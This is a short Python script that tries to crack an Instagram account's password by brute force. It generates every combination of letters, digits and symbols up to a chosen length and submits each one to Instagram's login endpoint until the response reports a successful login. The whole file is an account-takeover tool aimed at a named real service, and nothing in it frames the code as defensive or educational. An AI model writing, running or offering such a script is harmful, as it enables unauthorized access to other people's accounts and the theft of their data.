import itertools
import requests

def crack_password(username, password_length):
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+:;'
    for password in itertools.product(chars, repeat=password_length):
        password = ''.join(password)
        session = requests.Session()
        response = session.post('https://www.instagram.com/accounts/login/ajax/', data={'username':username, 'password':password})
        if 'authenticated":true' in response.text:
            print('Password found:', password)
            return
    print('Password not found')
